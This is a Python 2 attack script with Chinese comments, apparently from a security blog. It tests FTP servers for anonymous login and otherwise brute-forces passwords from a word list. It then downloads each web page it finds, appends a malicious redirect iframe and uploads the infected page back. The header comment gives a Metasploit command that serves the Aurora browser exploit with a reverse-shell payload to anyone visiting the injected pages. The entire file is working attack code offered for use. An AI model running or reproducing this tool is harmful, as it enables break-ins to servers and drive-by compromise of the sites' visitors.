#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/13
# Created by 冰河
# Description 完整的感染FTP服务器上的网页脚本
#             具体流程：
#               1.首先看FTP服务器能不能匿名登录，如果不能，则暴力破解口令
#               2.破解出口令或者能够匿名登录，则登录到FTP站点上发动攻击
#               3.搜索默认的网页
#               4.下载每个被找到的网页，并在其中加入恶意重定向代码
#               6.将被挂马的网页传回FTP服务器
# 在Kali下配合 msfcli exploit/windows/browser/ms10_002_aurora LHOST=192.168.175.128 SRVHOST=192.168.175.128 URIPATH=/exploit PAYLOAD=windows/shell/reverse_tcp LPORT=443 E
# 只要其他主机访问了https://192.168.175.128/exploit，同时浏览器存在漏洞，即可获得目标客户端的shell权限
#
# 博客 https://blog.csdn.net/l1028386804

import ftplib
import optparse
import time

default_username = 'anonymous'
default_password = 'me@your.com'

#判断主机上的FTP服务器是否可以匿名登录，可以则返回True,否则返回False
def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(default_username, default_password)
        print '\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded.'
        ftp.quit()
        return True
    except Exception, e:
        print '\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.'
        return False

#暴力破解FTP登录口令
def bruteLogin(hostname, passwdFile):
    pf = open(passwdFile, 'r')
    for line in pf.readlines():
        time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print '[+] Trying: ' + userName + '/' + passWord
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print '\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName + '/' + passWord
            ftp.quit()
            return (userName, passWord)
        except Exception, e:
            pass
    print '\n[-] Could not bruteforce FTP credentials.'
    return (None, None)


#搜索默认的网页，将搜索到的网页加入到一个数组中并返回
def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print '[-] Could not list directory contents.'
        print '[-] Skipping To Next Target.'
        return

    retList = []
    #遍历目录下的所有文件
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn or '.jsp' in fn:
            print '[+] Found default page: ' + fileName
            retList.append(fileName)
    return retList;


#注入网页
def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print '[+] Downloaded Page: ' + page
    f.write(redirect)
    f.close()
    print '[+] Injected Malicious IFrame on: ' + page
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print '[+] Uploaded Injected Page: ' + page

#攻击方法
def attack(username, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)
    #遍历找到的每一个网页，注入每个网页
    for defPage in defPages:
        injectPage(ftp, defPage, redirect)

#主函数
def main():
    parser = optparse.OptionParser('usage%prog -H <target host[s]> -r <redirect page> [-f <userpass file>]')
    parser.add_option('-H', dest='tgtHosts', type='string', help='specify target host')
    parser.add_option('-f', dest='passwdFile', type='string', help='specify user/password file')
    parser.add_option('-r', dest='redirect', type='string', help='specify a redirection page')
    (options, args) = parser.parse_args()
    #多个主机之间以逗号分隔
    tgtHosts = str(options.tgtHosts).split(',')
    passwdFile = options.passwdFile
    redirect = options.redirect
    if tgtHosts == None or redirect == None:
        print parser.usage
        exit(0)

    #遍历个主机
    for tgtHost in tgtHosts:
        username = None
        password = None
        #主机上的FTP服务器可以匿名登录
        if anonLogin(tgtHost) == True:
            username = default_username
            password = default_password
            print '[+] Using Anonymous Creds to attack'
            attack(username, password, tgtHost, redirect)

        #密码文件不为空
        elif passwdFile != None:
            #暴力破解FTP登录口令
            (username, password) = bruteLogin(tgtHost, passwdFile)

        if password != None:
            print '[+] Using Creds: ' + username + '/' + password + ' to attack'
            attack(username, password, tgtHost, redirect)

#程序入口
if __name__ == '__main__':
    main()




